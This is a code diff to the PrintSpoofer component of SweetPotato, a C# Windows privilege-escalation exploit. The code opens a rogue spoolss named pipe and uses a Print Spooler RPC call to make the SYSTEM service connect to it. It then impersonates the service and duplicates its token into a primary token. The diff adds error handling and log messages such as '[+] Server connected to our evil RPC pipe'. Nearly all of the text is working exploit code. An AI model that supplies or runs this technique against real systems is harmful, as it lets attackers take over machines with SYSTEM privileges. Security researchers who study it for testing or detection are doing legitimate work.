@@ -12,6 +12,8 @@ using System.Threading.Tasks;
 namespace SweetPotato {
     internal class PrintSpoofer {
 
+        static int PRINTER_CHANGE_ADD_JOB = 0x00000100;
+
         string pipeName = Guid.NewGuid().ToString();
         string hostName = System.Net.Dns.GetHostName();
 
@@ -27,14 +29,26 @@ namespace SweetPotato {
 
             spoolPipe = new NamedPipeServerStream($"{pipeName}\\pipe\\spoolss", PipeDirection.InOut, 10, PipeTransmissionMode.Byte, PipeOptions.None, 2048, 2048);
             spoolPipe.WaitForConnection();
+
+            Console.WriteLine("[+] Server connected to our evil RPC pipe");
+
             spoolPipe.Read(data, 0, 4);
 
             spoolPipe.RunAsClient(() => {
+                if (!ImpersonationToken.OpenThreadToken(ImpersonationToken.GetCurrentThread(),
+                    ImpersonationToken.TOKEN_ALL_ACCESS, false, out var tokenHandle)) {
+                    Console.WriteLine("[-] Failed to open thread token");
+                    return;
+                }
 
-                IntPtr tokenHandle;
-                ImpersonationToken.OpenThreadToken(ImpersonationToken.GetCurrentThread(), ImpersonationToken.TOKEN_ALL_ACCESS, false, out tokenHandle);
-                ImpersonationToken.DuplicateTokenEx(tokenHandle, ImpersonationToken.TOKEN_ALL_ACCESS, IntPtr.Zero,
-                    ImpersonationToken.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, ImpersonationToken.TOKEN_TYPE.TokenPrimary, out systemImpersonationToken);
+                if (!ImpersonationToken.DuplicateTokenEx(tokenHandle, ImpersonationToken.TOKEN_ALL_ACCESS, IntPtr.Zero,
+                    ImpersonationToken.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
+                    ImpersonationToken.TOKEN_TYPE.TokenPrimary, out systemImpersonationToken)) {
+                    Console.WriteLine("[-] Failed to duplicate impersonation token");
+                    return;
+                }
+                
+                Console.WriteLine("[+] Duplicated impersonation token ready for process creation");
             });
 
             spoolPipe.Close();
@@ -47,21 +61,20 @@ namespace SweetPotato {
 
         public void TriggerPrintSpoofer() {
 
-            string captureServer = String.Format($"\\\\{hostName}/pipe/{pipeName}");
-            string printerHost = String.Format($"\\\\{hostName}");
+            string captureServer = string.Format($"\\\\{hostName}/pipe/{pipeName}");
+            string printerHost = string.Format($"\\\\{hostName}");
 
             Client c = new Client();
-
-            NdrContextHandle handle;
-            Struct_0 devModeContainer = new Struct_0();
-
-            int PRINTER_CHANGE_ADD_JOB = 0x00000100;
-
-            c.Connect(new RpcEndpoint( c.InterfaceId, c.InterfaceVersion, "ncacn_np:[\\\\pipe\\\\spoolss]", false), null);
-
             c.Connect();
 
-            int result = c.RpcOpenPrinter(printerHost, out handle, null, devModeContainer, 0);
+            Struct_0 devModeContainer = new Struct_0();
+
+            if (c.RpcOpenPrinter(printerHost, out var handle, null, devModeContainer, 0) != 0) {
+                Console.WriteLine("[-] Failed to open printer over RPC");
+                return;
+            }
+
+            Console.WriteLine($"[+] Triggering notification on evil PIPE {captureServer}");
             c.RpcRemoteFindFirstPrinterChangeNotificationEx(handle, PRINTER_CHANGE_ADD_JOB, 0, captureServer, 0, null);
             c.RpcClosePrinter(ref handle);
         }
